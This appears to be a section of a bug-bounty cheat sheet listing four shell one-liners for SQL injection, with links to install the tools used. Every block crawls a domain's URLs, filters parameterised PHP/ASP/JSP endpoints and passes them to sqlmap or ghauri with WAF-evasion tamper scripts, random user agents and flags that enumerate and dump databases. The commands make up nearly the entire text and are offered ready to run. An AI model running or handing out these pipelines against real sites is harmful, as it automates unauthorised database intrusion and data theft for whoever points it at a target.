### SQLI
```
urlfinder -d "vulnweb.com" -all| iconv -f ISO-8859-1 -t UTF-8 | match -r "*" -m ~/payloads/sqli.txt | anew | httpx -duc | tee sqli.txt; sqlmap -m sqli.txt --batch --current-db --random-agent --tech=EBT --tamper=space2comment,xforwardedfor,symboliclogical,between,charunicodeencode
```
### SQLi All
```
urlfinder -d "example.com" -all | grep -aE '\.(php|asp|aspx|jsp|cfm)' | qsreplace "SQLI" | grep -a "SQLI" | anew > sqli.txt;ghauri -m sqli.txt --random-agent --confirm --force-ssl --level=3 --dbs --dump --batch
```
<p>install <a href="https://github.com/projectdiscovery/urlfinder" target="_blank">urlfinder</a>, <a href="https://github.com/tomnomnom/qsreplace" target="_blank">qsreplace</a>, <a href="https://github.com/tomnomnom/anew" target="_blank">anew</a>, <a href="https://github.com/r0oth3x49/ghauri" target="_blank">ghauri</a></p>

### Blind SQLi
```
urlfinder -d "example.com" -all | grep -aE '\.(php|asp|aspx|jsp|cfm)' | qsreplace "SQLI" | grep -a "SQLI" | anew > sqli.txt;sqlmap -m sqli.txt --technique=BT --level=5 --risk=3 --tamper=space2comment,sleep2getlock,space2randomblank,between,randomcase,randomcomments,bluecoat,ifnull2ifisnull --batch --random-agent --no-cast --current-db --hostname
```
<p>install <a href="https://github.com/projectdiscovery/urlfinder" target="_blank">urlfinder</a>, <a href="https://github.com/tomnomnom/qsreplace" target="_blank">qsreplace</a>, <a href="https://github.com/tomnomnom/anew" target="_blank">anew</a>, <a href="https://github.com/sqlmapproject/sqlmap" target="_blank">sqlmap</a></p>

### Time Based SQLi
```
urlfinder -d "vulnweb.com" -all | iconv -f ISO-8859-1 -t UTF-8 | grep -aE '\?.*=.*(&.*)?' | grep -aEi '\.(php|asp|aspx|jsp|jspx|cfm|xml)' | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|jpeg|js|json|pdf|gif|webp)($|\s|\?|&|#|/|\.)" | awk -F'[?&=]' '!seen[$1$2]++' | anew>sqli.txt;ghauri -m sqli.txt --level=3 --dbs --batch --confirm --technique=T
```
